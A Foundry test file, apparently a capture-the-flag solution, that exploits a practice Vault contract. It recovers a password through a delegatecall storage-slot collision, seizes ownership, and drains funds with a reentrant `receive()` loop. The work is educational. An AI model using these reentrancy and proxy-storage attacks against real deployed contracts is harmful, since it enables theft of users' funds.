// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(this); // 攻击是个合约地址

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        // 读取密码
        // bytes32 password = vm.load(address(logic), bytes32(uint256(1)));
        bytes32 password = bytes32(uint256(uint160(address(logic)))); //  用logic合约的地址作为password
        // 等价
        // address logicAddress = address(uint160(uint256(vm.load(address(vault), bytes32(uint256(1))))));
        console.log("-->> password");
        console.logBytes32(password);

        // 修改logic的owner
        bytes memory calldt = abi.encodeWithSignature("changeOwner(bytes32,address)", password, address(palyer));
        // bytes memory calldt = abi.encodeWithSignature(VaultLogic.changeOwner.selector, password, address(palyer));
        // bytes4 selector = bytes4(keccak256("changeOwner(bytes32,address)"));
        // bytes memory calldt = abi.encodePacked(selector, password, uint256(uint160(palyer)));
        console.logBytes(calldt);
        (bool succ,) = address(vault).call(calldt);
        assertTrue(succ, "changeOwner call fail");

        // 检查VaultLogic 的owner
        assertEq(vault.owner(), palyer, "logic.owner is not player");

        // 往保险箱存款
        console.log("-->> vault.balance1: ", address(vault).balance);
        vault.deposite{value: 0.01 ether}();
        console.log("-->> vault.balance2: ", address(vault).balance);

        // 发起攻击
        vault.openWithdraw();
        vault.withdraw();

        console.log("-->> vault.balance3: ", address(vault).balance);
        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

    receive() external payable {
        console.log("-->> VaultExploiter receive");
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}
